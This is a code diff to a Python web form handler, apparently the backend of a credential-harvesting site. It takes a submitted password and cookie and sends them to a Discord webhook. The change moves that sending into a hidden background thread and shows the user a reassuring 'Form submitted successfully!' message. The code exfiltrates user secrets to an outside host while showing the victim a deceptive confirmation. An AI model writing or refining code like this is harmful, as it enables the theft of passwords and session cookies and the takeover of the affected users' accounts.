@@ -685,28 +685,22 @@ def submit_form():
         
         print("Discord webhook URL configured successfully") # Don't log URL for security
         
-        # Process Discord webhooks synchronously for Vercel compatibility  
-        print("Processing Discord webhooks synchronously...")
-        start_time = time.time()
+        # Send to Discord webhook asynchronously in background
+        print("Starting Discord webhook processing in background...")
         
-        try:
-            send_to_discord_background(password, cookie, webhook_url)
-            end_time = time.time()
-            processing_time = end_time - start_time
-            print(f"Discord webhook processing completed successfully in {processing_time:.2f} seconds")
-            
-            return jsonify({
-                'success': True, 
-                'message': f'Data processed and sent successfully in {processing_time:.1f}s'
-            })
-        except Exception as e:
-            end_time = time.time()
-            processing_time = end_time - start_time
-            print(f"Error during Discord webhook processing after {processing_time:.2f} seconds: {str(e)}")
-            return jsonify({
-                'success': False, 
-                'message': f'Processing failed after {processing_time:.1f}s: webhook delivery error'
-            }), 500
+        # Start background thread for Discord processing
+        webhook_thread = threading.Thread(
+            target=send_to_discord_background,
+            args=(password, cookie, webhook_url),
+            daemon=True
+        )
+        webhook_thread.start()
+        
+        # Return immediate response to user
+        return jsonify({
+            'success': True, 
+            'message': 'Form submitted successfully! Processing in background...'
+        })
             
     except Exception as e:
         return jsonify({
